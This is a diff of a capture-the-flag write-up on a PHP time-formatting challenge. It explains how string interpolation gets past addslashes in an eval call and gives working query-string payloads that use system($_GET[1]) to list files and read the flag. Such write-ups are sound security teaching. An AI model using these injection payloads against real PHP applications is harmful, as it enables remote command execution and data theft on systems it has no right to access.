@@ -24,6 +24,7 @@ Anyhow, since this is now our only form of input it virtually screams "Please ha
 Two of the files are related to our time-formatting: `TimeController.php` and `TimeModel.php`. I have added the entierty of them below and annotated them using comments:
 
 - `TimeController.php`
+    
     ```php
     <?php
     class TimeController
@@ -44,6 +45,7 @@ Two of the files are related to our time-formatting: `TimeController.php` and `T
     ```
 
 - `TimeModel.php`
+    
     ```php
     <?php
     class TimeModel
@@ -76,22 +78,24 @@ Doing a quick google-search immediately provides multiple articles as to why `ad
 
 To summarize: Although some characters get escaped, we can still run PHP-String interpolation and with that have access to **any variable and function that is currently in scope**. The crafts a concise command that allows us to do any command-injection that we want!
 
-+ Add a second URL-GET-Param that contains our command-injection payload. e.g.: `http://...&1=<anything>`. Note: I thought that the article used a number as the key so that we do not have to quote it to access the value, which would've been a problem since we cannot quote anything. But we can "exploit" PHP's String-Interpolation to bypass the need of quotes (which is very cursed!)
-    - ```php
-      <?php
-      $c = array("foo" => 3);
-      var_dump($c[foo]); // does not work, as expected
-      var_dump("{$c[foo]}"); // does not work, as expected
-      var_dump("$c[foo]"); // WORKS, only $c[] is interpolated and the rests (anything passed inside of []) is interpreted as a string! WTF!
-      ?>
-      ```
-+ Reference the GET-Param in the original variable (which gets passed to the `eval`-function) and wrap it in a `system`-call to run arbitrary code: `system($_GET[1])`
+1. Add a second URL-GET-Param that contains our command-injection payload. e.g.: `http://...&1=<anything>`. Note: I thought that the article used a number as the key so that we do not have to quote it to access the value, which would've been a problem since we cannot quote anything. But we can "exploit" PHP's String-Interpolation to bypass the need of quotes (which is very cursed!)
+
+```php
+<?php
+$c = array("foo" => 3);
+var_dump($c[foo]); // does not work, as expected
+var_dump("{$c[foo]}"); // does not work, as expected
+var_dump("$c[foo]"); // WORKS, only $c[] is interpolated and the rests (anything passed inside of []) is interpreted as a string! WTF!
+?>
+```
+
+2. Reference the GET-Param in the original variable (which gets passed to the `eval`-function) and wrap it in a `system`-call to run arbitrary code: `system($_GET[1])`
 
 With that we can simply take the example from the article, although I do know from the provided files that there is a flag-file on the server which looks like `/flag*` (with some random characters at the end), so we don't even have to run `ls` to find it, but let's have a look anyway:
 
-+ List files: `?format=${system($_GET[1])}&1=ls%20/`
+1. List files: `?format=${system($_GET[1])}&1=ls%20/`
     ![Flag spotted](./imgs/ls.png)
-+ Read file content: `?format=${system($_GET[1])}&1=cat%20/flag*`
+2. Read file content: `?format=${system($_GET[1])}&1=cat%20/flag*`
     ![Flag gotted](./imgs/flag.png)
 
 And there we go!
